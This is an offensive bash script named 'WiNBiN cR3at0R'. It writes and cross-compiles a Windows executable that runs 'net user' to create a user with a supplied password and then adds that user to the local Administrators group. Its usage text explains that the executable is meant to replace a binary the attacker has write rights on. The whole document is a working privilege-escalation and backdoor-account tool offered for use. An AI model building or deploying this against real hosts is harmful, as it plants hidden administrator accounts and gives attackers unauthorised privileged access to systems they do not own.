#!/bin/bash
usage()
{
        echo " ##################################################### "
        echo "#'               WiNBiN cR3at0R  v0.1                '#"
        echo "#,          by: LancreFi                             ,#"
        echo " ##################################################### "
        echo "#'                                                   '#"
        echo "#  Usage: bash winbin.sh <payload> <param1> <param2>  #"
        echo "#                                                     #"
        echo "#  Available payloads: adduser                        #"
        echo "#                      creates an executable which    #"
        echo "#                      when run can try to add the    #"
        echo "#                      param1 user with param2 pasw   #"
        echo "#                      to a windows host's group of   #"
        echo "#                      Administrators. For example if #"
        echo "#                      you have F rights on a bin you #"
        echo "#                      can replace with this.         #"
        echo "#                                                     #"
        echo "#,___________________________________________________,#"
}


command="${1}"
builder="x86_64-w64-mingw32-gcc"

if [[ "${command^^}" == "ADDUSER" ]]
then
        user="${2}"
        if [[ -z "${user}" ]]
        then
                echo "You forgot to add the destination username and password!"
                exit
        fi
        pass="${3}"
        if [[ -z "${pass}" ]]
        then
                echo "You forgot to add the destination password!"
                exit
        fi

printf '#include <stdlib.h>
int main ()
{
        int i;
        i = system ("net user '${user}' '${pass}' /add");
        i = system ("net localgroup administrators '${user}' /add");
        return 0;
}' > "${command}.c"

        build_params="${command}.c -o ${command}.exe"
        ${builder} ${build_params}
        echo "Created ${command}.c and ${command}.exe"
elif [[ "${command^^}" == "-H" ]] || [[ "${command^^}" == "--HELP" ]]
then
        usage
else
        exit
fi
